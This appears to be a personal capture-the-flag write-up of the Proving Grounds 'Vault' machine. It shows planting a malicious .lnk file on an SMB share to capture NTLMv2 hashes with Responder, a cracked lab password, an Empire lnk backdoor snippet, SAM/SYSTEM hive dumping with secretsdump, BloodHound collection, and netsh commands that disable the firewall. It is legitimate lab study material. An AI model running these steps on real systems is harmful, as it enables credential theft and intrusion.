# Vault Helped-Through

Name: Vault
Date:  10/5/2023
Difficulty: Hard  
Goals:  
- Previous OSCP practice exam 
Learnt:
- Some Practice machines are not for OSCP.

Previously I tried to do this machine as part of a practice OSCP exam attempt. Little did I know that this machine required responder. Although I really excelled in finding and combing through machines it also really hurt my chances with stress and that made me reconsider long term plans. Hopeful the later half of this year will bring a better life in many respects. One very important event was discovery and really trying to emulate and understand hackers like [XCT](https://www.youtube.com/watch?v=fRbVdbY1d28), prior to the recent rank changes of HTB seasons was top 1 on HTB. The rankinug which will move to official post beta phase in less than 30 days. I have set my sights on atleast getting Silver rank out of Bronze, Silver, Ruby, Platinum and Holo, but go for Ruby. I think I could maybe get one hard machine in a week, but I doubt it and I would have to get lucky.

## Recon - Previous Attempt

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](OS-ProvingGrounds/Vault/Screenshots/ping.png)

There are shares
![](enumfourlinuxshares.png)
smbmap show permissions
![](readwriteShare.png)

Bang on the [Tamil music to stay culturally enriched](https://www.youtube.com/watch?v=V8R1aZf1-AU). Anirudh is a tamil name on first google. 
![](bruteridsanirudh.png)

We have a writable share, a username - need a password and means of execution. After considering everything I went for both enumeration hint - it is ballbuster because it declare the the share is writable and the second is that there is a scripted user that will click shortlinks.

"Mount a client-side attack by uploading a shortcut file to the SMB share. A user will view the share and render file icons in it."

After some checking. This is definately not a OSCP like machine. So I am going to use metasploit or some C2  as I thought that this would not involve fake social engineering practice. Basically to keep the process clean and not mental fazzle myself doing this machine. Also [pentesterlab](https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/) suggests we can use Empire which is OSCP related.

Edited from the article
```python
usemodule powershell/persistence/userland/backdoor_lnk
usestager windows/launcher_lnk
set Listener http
execute
```

We can put a shell on `smbclient -N ///DocumentsShare -U guest%<put empty quotes here>``

Did not get call back, but I also did not remove it from the share, so it is not considered malicious. So it might that want something really specific. For my 12 hour assessment - I am happy I enumerated well, will give myself the hour remaining to finish HTB Acute. 

## Return with XCT 

Regardless Client-Side Attacks are still part of OSCP course, but there is never pretend users in the exam. 

- Legacy Windows machine .scf could be used to beacon back to you box
- Shortcut files .lnk
- [XCT's Hashgrab](https://github.com/xct/hashgrab) - *"Generates scf, url & lnk payloads to put onto a smb share. These force authentication to an attacker machine in order to grab hashes (for example with responder)."*

```bash
smbclient -L \\192.168.156.172
# Connect to share
smbclient \\\\192.168.156.172\\DocumentsShare
# Test upload - smb: get $file
# Hashgrab
python3 hashgrab.py 192.168.45.5 xctisawesome
# Responder 
sudo responder -I tun0 
# Reconnect to share
smbclient \\\\192.168.156.172\\DocumentsShare
put xctisawesome.lnk
# wait..
```

And NLTMv2 relay!
![1080](anirudhshash.png)

Crack to get:
```
anirudh : SecureHM
```

## PrivEsc

Although as I have the walkthrough open for this I 
![1080](whoisanirudh.png)

We can perform backup of SYSTEM hive and dump with `impacket-secretsdump`
```powershell
cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
*Evil-WinRM* PS> download SYSTEM
*Evil-WinRM* PS> download SAM
# Wait...
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

![](administratorhash.png)

Can not WinRM in with hash. At this point I turned to the video as I do not want to crack hashes. He discusses GPOs but I want to enumerate to atleast find the vector.
![](cmemodules.png)

We could use powerview.ps1
![](gpowithpowerview.png)

I ran the latest winpeas 
![](permiswinpeas.png)

Remote [Bloodhound.py](https://github.com/fox-it/BloodHound.py)
```bash
sudo python3 bloodhound.py -c all -d vault.offsec -ns 192.168.156.172 -u 'anirudh' -p 'SecureHM'
```


https://www.youtube.com/watch?v=fRbVdbY1d28 - 4:15

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#exploit-group-policy-objects-gpo

https://github.com/FuzzySecurity/StandIn

## Beyond Root

#### Unintended Ways

https://github.com/xct/xc to celebrate kick the bad memories of this machine out will a bang I want to promote XCT and his xc shell.


#### Firewall fun

Firewall fun has been sitting in my to do list for beyond root.
```powershell
# Check Profile
netsh advfirewall show currentprofile

# Turn off the Firewall
NetSh Advfirewall set allprofiles state off

# Modify a Firewall Rule for a program
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=in enable=yes action=allow profile=Private
netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=out enable=yes action=allow profile=Private
# Delete a rule
netsh.exe advfirewall firewall delete rule "<Rule Name>"
```
[test](https://www.itninja.com/blog/view/how-to-add-firewall-rules-using-netsh-exe-advanced-way)


```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
Format-Table -Property 
DisplayName, 
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,
Profile,
Direction,
Action"
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"

```

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
```


